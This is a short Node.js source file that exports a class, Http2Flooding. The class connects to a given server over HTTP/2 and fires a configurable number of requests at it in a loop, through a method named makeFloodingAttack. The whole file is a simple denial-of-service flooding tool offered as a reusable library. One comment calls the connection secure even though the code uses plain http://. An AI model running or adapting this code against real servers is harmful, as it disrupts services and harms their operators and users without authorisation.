const http2 = require('http2');

/**
 * @param ip: it represents the ip address of the server
 * @param port: it represents the port of the server
 * @param numberOfRequests: it represents the number of requests for each thread
 * 
 * 
 * 
 */
class Http2Flooding {
     /**
     *
     * @param {string} ip
     * @param {number} port
     * @param  {number} numberOfRequests
     */
    ip;
    port;
    numberOfRequests;

    constructor(ip, port,numberOfRequests) {
      
      this.ip = ip;  
      this.port = port;
      this.numberOfRequests=numberOfRequests
    }
/**
 * It establishes a secure connection with http2 server
 * Note that in this case there is no mutual authentication, but only one way authentication
 * @returns  a ClientHttp2Session instance through the object client
 * 
 */
    connectToServer(){
      let address= 'http://'.concat(this.ip).concat(':').concat(this.port).concat('/');
      const client = http2.connect(address);
        return client;
    }

    makeFloodingAttack(client,method,path){
      console.log("funzione :metodo",method," ",path);
         for (let i = 0; i <  this.numberOfRequests ; i++) {
           console.log(`Making request ${i + 1}...`);
           const req = client.request({
                  ':method': method,         
                  ':path': path
             });
             req.on('response', (headers) => {
                console.log(headers[':status']);
              });
              req.on('end', () => {
                client.close();
              });
              req.end();
      }
    }

      
  }

  //it exports the class as a library to be used by other files
  module.exports = Http2Flooding;
